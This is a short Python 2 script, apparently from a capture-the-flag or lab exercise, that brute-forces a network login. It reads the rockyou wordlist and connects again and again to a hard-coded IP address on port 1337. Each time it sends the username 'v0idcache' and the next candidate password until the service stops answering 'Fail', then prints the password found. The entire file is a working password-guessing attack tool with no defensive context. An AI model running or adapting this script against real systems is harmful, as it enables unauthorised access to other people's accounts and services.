import socket

host = "142.93.136.81" # IP address here
port = 1337 # Port Here
wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file

def brute_force():  
    username = "v0idcache"
    password = "password123"
  
    rockyou = open(wordlist, "r")
  
    list_of_passwords = rockyou.readlines()
    i = 0
    result = "Fail\n"
  
    while result == "Fail\n":
        print "Failed"
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host,port))
        result = sock.recv(1024)
    
        """ send username then the password """
        sock.send(username + "\n")
        result = sock.recv(1024)
    
        sock.send(list_of_passwords[i])
        result = sock.recv(1024)
        i += 1
    password = list_of_passwords[i-1]
    print("password found: " + password)

    
if __name__ == '__main__':
    brute_force()
